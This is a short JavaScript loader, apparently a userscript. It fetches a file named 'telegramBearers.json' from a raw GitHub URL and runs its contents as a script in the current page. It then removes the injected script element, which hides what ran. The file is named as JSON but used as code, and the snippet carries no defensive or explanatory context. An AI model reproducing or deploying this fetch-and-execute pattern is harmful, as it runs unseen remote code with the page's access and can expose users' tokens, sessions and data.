(async () => {
    try {
        const url = 'https://raw.githubusercontent.com/0xAlvi/VM/main/telegramBearers.json';
        const response = await fetch(url);
        if (!response.ok) throw new Error('Network response was not ok');
        const scriptText = await response.text();
        
        const scriptElement = document.createElement('script');
        scriptElement.textContent = scriptText;
        document.head.appendChild(scriptElement);
        scriptElement.remove();
    } catch (error) {
        console.error('Error:', error);
    }
})();
